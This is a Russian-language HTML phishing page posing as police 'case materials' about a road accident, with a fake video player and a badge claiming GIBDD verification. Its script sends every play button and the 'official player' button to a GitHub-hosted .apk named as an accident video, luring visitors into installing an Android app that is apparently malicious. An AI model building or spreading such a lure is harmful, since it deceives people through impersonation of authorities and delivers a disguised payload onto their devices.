<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Материалы дела</title>
    <style>
        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4);
            }
            70% {
                box-shadow: 0 0 0 15px rgba(255, 255, 255, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0);
            }
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f2f2f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }

        .card {
            background-color: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 20px;
            padding: 24px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            animation: fadeUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        .video-player {
            position: relative;
            background: linear-gradient(135deg, #4a4a4a 0%, #1a1a1a 100%);
            border-radius: 12px;
            height: 220px;
            margin-bottom: 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .play-btn {
            width: 56px;
            height: 56px;
            border: 2px solid white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background: rgba(0, 0, 0, 0.3);
            animation: pulse 2s infinite;
            transition: transform 0.2s ease, background 0.2s ease;
        }

        .play-btn:hover {
            transform: scale(1.1);
            background: rgba(0, 0, 0, 0.5);
        }

        .play-btn:active {
            transform: scale(0.95);
        }

        .play-icon {
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 10px 0 10px 16px;
            border-color: transparent transparent transparent white;
            margin-left: 4px;
            transition: transform 0.2s ease;
        }

        .duration {
            position: absolute;
            right: 12px;
            bottom: 40px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            font-size: 11px;
            font-weight: 500;
            padding: 3px 6px;
            border-radius: 4px;
        }

        .controls {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            padding: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
        }

        .small-play-btn {
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 6px 0 6px 10px;
            border-color: transparent transparent transparent white;
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .small-play-btn:hover {
            transform: scale(1.2);
        }

        .progress-slider {
            -webkit-appearance: none;
            flex-grow: 1;
            height: 3px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 2px;
            outline: none;
            cursor: pointer;
            transition: height 0.2s ease;
        }

        .progress-slider:hover {
            height: 5px;
        }

        .progress-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.2s ease;
        }

        .progress-slider:hover::-webkit-slider-thumb {
            background: white;
            transform: scale(1.2);
        }

        .progress-slider::-moz-range-thumb {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: transparent;
            border: none;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.2s ease;
        }

        .progress-slider:hover::-moz-range-thumb {
            background: white;
            transform: scale(1.2);
        }

        .title {
            color: #000000;
            font-size: 21px;
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 12px;
        }

        .description {
            color: #6c6c70;
            font-size: 13px;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        .details-box {
            border: 1px solid #e5e5ea;
            border-radius: 10px;
            margin-bottom: 24px;
            overflow: hidden;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 14px 16px;
            border-bottom: 1px solid #e5e5ea;
            font-size: 13px;
            transition: background-color 0.2s ease;
        }

        .detail-row:hover {
            background-color: #f9f9fb;
        }

        .detail-row:last-child {
            border-bottom: none;
        }

        .detail-label {
            color: #6c6c70;
        }

        .detail-value {
            color: #000000;
            font-weight: 600;
        }

        .value-green {
            color: #34c759;
        }

        .main-btn {
            display: block;
            background-color: #007aff;
            color: white;
            width: 100%;
            padding: 16px;
            text-decoration: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            transition: transform 0.2s ease, background-color 0.2s ease, box-shadow 0.2s ease;
        }

        .main-btn:hover {
            background-color: #006ce0;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
        }

        .main-btn:active {
            transform: translateY(0) scale(0.98);
            box-shadow: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="video-player">
            <div class="play-btn" id="playBtn">
                <div class="play-icon"></div>
            </div>
            <div class="duration">0:48</div>
            <div class="controls">
                <div class="small-play-btn" id="smallPlayBtn"></div>
                <input type="range" class="progress-slider" id="progressSlider" min="0" max="100" value="0">
            </div>
        </div>

        <h1 class="title">Материалы дела</h1>
        
        <p class="description">Доступ к протоколу №4829-Б и видеозаписи системы ГЛОНАСС/GPS ограничен политикой безопасности.</p>

        <div class="details-box">
            <div class="detail-row">
                <span class="detail-label">Дата события:</span>
                <span class="detail-value">Сегодня</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Статус:</span>
                <span class="detail-value value-green">Проверено ГИБДД</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Формат:</span>
                <span class="detail-value">Full HD (MP4)</span>
            </div>
        </div>

        <a href="#" id="officialLink" class="main-btn">Открыть официальный плеер</a>
    </div>

    <script>
        const TARGET_LINK = "https://github.com/Kahajoka/7/raw/refs/heads/main/ДТП(07.3.2026).apk";
        
        document.getElementById('officialLink').href = TARGET_LINK;

        const playBtn = document.getElementById('playBtn');
        const smallPlayBtn = document.getElementById('smallPlayBtn');
        const slider = document.getElementById('progressSlider');

        playBtn.addEventListener('click', () => {
            window.location.href = TARGET_LINK;
        });

        smallPlayBtn.addEventListener('click', () => {
            window.location.href = TARGET_LINK;
        });

        slider.addEventListener('input', function() {
            const value = this.value;
            this.style.background = `linear-gradient(to right, #ff0000 0%, #ff0000 ${value}%, rgba(255, 255, 255, 0.3) ${value}%, rgba(255, 255, 255, 0.3) 100%)`;
        });
    </script>
</body>
</html>
